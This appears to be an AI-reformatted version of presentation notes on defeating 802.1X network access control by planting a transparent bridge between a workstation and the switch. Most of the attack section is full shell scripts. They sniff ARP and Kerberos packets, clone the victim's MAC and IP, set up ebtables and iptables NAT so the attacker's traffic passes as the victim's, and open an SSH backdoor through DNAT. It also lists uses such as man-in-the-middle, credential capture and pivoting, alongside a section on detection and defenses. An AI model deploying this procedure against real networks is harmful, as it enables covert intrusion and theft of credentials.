Certainly! Here is the optimized version of your text, structured for clarity and professionalism:

---

### Data Collection and Analysis

#### TCP Packet Collection
We should be able to collect the necessary data quickly. However, if there is a lot of intersegment communication, it may be challenging to find the gateway.

#### TCP Services
TCP services, such as Active Directory, web, and Kerberos, can provide all the required information in a single packet, assuming these services are in different segments.
```sh
# Command to capture TCP packets
tcpdump –nne tcp
```
Example output:
```
19:27:28.390751 c0:c1:c0:76:35:7c > 00:0c:29:ea:ed:ee, ethertype IPv4 (0x0080), length 1514: 192.168.0.10.49776 > 10.0.1.3.80: . 113771:115231(1460) ack 1560 win 256
```

### TCP Analysis

#### Network with Active Directory
For a network that uses Active Directory, TCP appears to be the most effective method. For example, from a cold boot to login on a Windows 7 machine connected to a domain, I captured almost 600 TCP packets, all directed to the domain controller. Additionally, more traffic is generated every 15 minutes even on an idle system.

#### Challenges with TCP
To collect enough TCP packets, we need to wait for an AD traffic burst or for user interactions like logging in, mounting shares, or visiting a web page.

#### Consensus
TCP is likely the safest approach, but it requires time to observe the traffic unless there is some interaction or we facilitate it.

### ARP vs. TCP

On a populated network, ARP is faster but potentially less accurate, while TCP is slower but more precise. I have implemented both methods, and the code is fairly similar. For this presentation, I will use TCP and reboot the Windows machine to speed up the process.

### Automated Implementation (ARP)

1. Start Transparent
2. Sniff ARP traffic
   ```sh
   tcpdump -i eth3 -s0 -w /boot.pcap -c50 arp
   ```
   - 50 packets seem like a good number.
3. Analyze ARP replies
4. Extract information from ARP replies and requests

#### ARP Reply Analysis
ARP replies provide most of the needed information. Using the following command:
```sh
tcpdump -r boot.pcap -nne | grep 'is-at' | awk '{ print $2 "," $4  $12 "," $14}' | sort | uniq -c | sort -rn | head -1
```
Example output:
```
6 00:1b:fc:9d:2e:ef,00:26:b9:1b:02:97,192.168.15.1,00:1b:fc:9d:2e:ef
```
- `6` is the number of times the line appeared.
- `00:1b:fc:9d:2e:ef` is the MAC address of the source.
- `00:26:b9:1b:02:97` is the MAC address of the computer.
- `192.168.15.1` is the IP address of the source.
- `00:1b:fc:9d:2e:ef` is the same as the first MAC address.

To extract specific information:
```sh
awk -F ‘,’ '{print $2}'  # Yields the Computer MAC
awk -F ‘,’ '{print $3}'  # Yields the Gateway IP
awk -F ‘,’ '{print $4}'  # Yields the Gateway MAC
```

#### Final Step (ARP)
To get the computer's IP, grep for who asked for the gateway IP:
```sh
tcpdump -r boot.pcap -nne | grep $CMPMAC | grep -w "$GWIP tell" | head -1
```

### Automated Implementation (TCP)

1. Start Transparent
2. Sniff TCP traffic for AD packets (ports 135/445/88)
   ```sh
   tcpdump -r reboot.pcap -nne -c 1 tcp dst port 88
   ```
   - Only one packet is needed.
3. Extract necessary information from the packet

#### TCP Analysis
Command:
```sh
tcpdump -r boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d .
```
Example output:
```
c0:c1:c0:76:35:7c,00:0c:29:ea:ed:ee,192.168.0.10
```
- `c0:c1:c0:76:35:7c` is the source MAC (computer).
- `00:0c:29:ea:ed:ee` is the destination MAC (gateway).
- `192.168.0.10` is the computer's IP.

### Fully Automated TCP

#### Pre-populated Variables
```sh
SWINT=eth0
SWMAC=`ifconfig $SWINT | grep -i hwaddr | awk '{ print $5 }'`
BRINT=br0
COMPINT=eth3
BRIP=169.254.66.66
RANGE=61000-62000
DPORT=9876
```

#### Bridge Configuration
```sh
# Build the bridge
brctl addbr $BRINT
brctl addif $BRINT $COMPINT
brctl addif $BRINT $SWINT

# Bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc
ifconfig $SWINT 0.0.0.0 up promisc

# Ensure the bridge has the right MAC
macchanger -m $SWMAC $BRINT

# Bring up the bridge (transparent)
ifconfig $BRINT 0.0.0.0 up promisc

# Force the link to reset
mii-tool -r $COMPINT
mii-tool -r $SWINT

# Capture a single TCP packet destined for the DC (Kerberos)
tcpdump -i $COMPINT -s0 -w /boot.pcap -c1 tcp dst port 88
```

#### Setting Variables
```sh
COMPMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
GWMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $2}'`
COMIP=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $3","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $3}'`

# Start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

# Bring up the bridge with the bridge IP
ifconfig $BRINT $BRIP up promisc
```

#### NAT and Routing
```sh
# Create rules to source NAT the $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

# Static ARP entry for the default gateway
arp -s -i $BRINT 169.254.66.1 $GWMAC

# Add the default gateway
route add default gw 169.254.66.1

# Use DNAT to map $DPORT to $brip:22
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

# Set up the source NAT rules for TCP/UDP/ICMP
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

# Start SSH
/etc/init.d/ssh start

# Lift radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP
```

### Detection, Uses, and Final Thoughts

#### Detection
How do we detect if this is happening on our network? Are there any good ways to detect this attack?

#### User Awareness
- The same users who prompted us to implement 802.1X by bringing in personal laptops.
- Physical inspection under desks.
  - A user would need to know what should be there.
  - A label on the device saying "Network Signal Booster" might suffice to bypass the average user's attention.

#### Likely Result: Fail

#### P0f Style Traffic Analysis
- Traffic characteristics differ between Windows and Linux.
  - Linux TTL 64, Newer Windows 128.
  - Tunable under Linux `/proc/sys/net/ip_default_ttl`.
  - Default TCP window size differs between Windows and Linux.
- Likely Result: Possibly Burned

#### Other Weird Traffic on the Local Segment
- Traffic destined for the local subnet will have the gateway’s MAC address as the destination.
- Decent fingerprint for something unusual.
- Hard to fix without additional information on the local wire.
- Possible solution: Use tools like `arpwatch`.

#### Likely Result: Possibly Burned

#### Network Latency
- All network traffic passes through the bridge, causing inherent latency.
- Could be as much as two orders of magnitude.
- Hard to measure accurately.
- Likely Result: Fail

#### Network Throughput
- Like latency, hard to measure effectively.
- Mostly a "feels slower" issue for users.
- I was able to SCP a 3.5Gb file on a local segment through the plug at ~70Mbs on a 100Mbs link.
- Likely Result: Fail

#### Link Speed/Duplex Mismatch
- Astute network admins could notice if a link went from 1Gig to 100Mb or from half duplex to full duplex.
- Depending on the organization size, this is often unrealistic.
- With everything else the average admin has going on, it is unlikely this will catch anything.
- Likely Result: Fail

#### Excessive Up/Down Notices
- In the average workplace, link changes happen frequently.
- As long as the device authenticates and port security isn’t tripped, a few extra link up/down notices probably wouldn’t get caught.
- Likely Result: Fail

#### Detection Summary
- The best technological solution is to know your traffic’s IP characteristics.
- Other possible indicators include link/speed changes and excessive link up/down notices.
- Educate users about what should be under their desks and encourage them to ask questions if they see something unusual.

#### Possible Uses
- Man-in-the-middle attacks.
  - Poison web traffic via proxy or ettercap.
  - Perform client-side attacks by injecting code.
  - Capture credentials.
  - SSL proxying.
  - Phishing where email appears in the inbox without sending any email.

#### More Evil
- Network pivoting.
  - Attack local network resources and make it look like it came from the client computer.
  - Have callbacks directed inwards, not crossing firewall/IDS boundaries.
- Conduct a local/trusted insider assessment remotely.
  - Save on travel costs.

#### Common Alibis
- **Fiber**: Fiber is just a transport mechanism. Everything still works the same way, and fiber converters work fine.
- **NAC/NAP**: NAC/NAP implementations use 802.1X as their basis. As long as the credentials work, disconnects aren't unusual.

#### Defenses
- This is a physical attack. If someone can plant a malicious device on your network, you're already compromised.
- Requires an authorized port with an active client to work.
- IPSEC could mitigate some damage by preventing MITM possibilities.

#### Conclusions and Final Thoughts
- 802.1X only authorizes a port to pass traffic; it doesn’t handle per-packet authorization.
- Questions?

#### Acknowledgments
- Pete/Chris/Matt/Aaron/Mike/Devin
- Grep8000/Nelson/Lee/Nischit/Roman/Will
- Daryl/Nathan/Guy/Ermin/Charles/Deb/Dad
- And many, many more…

#### Reference Links
- [Classic 802.1X attack](http://sl.mvps.org/docs/802dot1x.htm)
- [Microsoft 802.1X documentation](http://technet.microsoft.com/en-us/library/cc512611.aspx)
- [IEEE 802.1D](http://standards.ieee.org/develop/regauth/tut/macgrp.pdf)
- [Wikipedia 802.1D](http://en.wikipedia.org/wiki/IEEE_802.1D)
- [Marvin MITM Tapping 802.1X Links](http://www.gremwell.com/marvin-mitm-tapping-dot1x-links)
- [Ephemeral Ports Info from Microsoft](http://support.microsoft.com/kb/929851)
- [802.1xbridge.com](http://802.1xbridge.com)
- Twitter: @8021xbridge

---